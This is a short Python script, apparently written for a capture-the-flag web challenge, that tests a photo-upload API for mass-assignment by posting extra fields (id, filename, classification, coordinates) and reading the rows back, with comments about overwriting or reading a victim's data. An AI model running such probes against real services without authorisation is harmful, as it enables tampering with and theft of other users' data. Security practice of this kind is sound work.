# probe_massassign.py — does /upload accept extra fields the JS never sends?
# If we can set our row's user_id to the VICTIM's, or read via an injected field, we win.
# Also: try to make OUR upload land under a KNOWN-readable value, or reflect victim data.
import requests, json, re
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
URI  = open("paisaje_datauri.txt").read().strip()

def up(extra, tag):
    body = {"image": URI, "description": tag, "user_id": UID}
    body.update(extra)
    r = requests.post(f"{BASE}/upload", json=body)
    return r.status_code, r.text[:80].strip()

tests = [
    ("baseline",    {}),
    ("set_id",      {"id": 1}),
    ("set_filename",{"filename": "test.jpg"}),
    ("set_class",   {"classification": "flag"}),
    ("set_ocr",     {"summary_ocr": "INJECTED_OCR"}),
    ("set_make",    {"make": "MASSMAKE"}),
    ("set_lat",     {"latitude": 99.9, "longitude": 88.8}),
]
for tag, extra in tests:
    sc, body = up(extra, "MA_"+tag)
    print(f"{tag:14} -> {sc}  {body}")

print("\n--- readback: did any extra field stick? ---")
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    if str(img.get("description","")).startswith("MA_"):
        print(json.dumps({k:img.get(k) for k in ('id','description','filename','classification','summary_ocr','make','latitude')}, ensure_ascii=False))
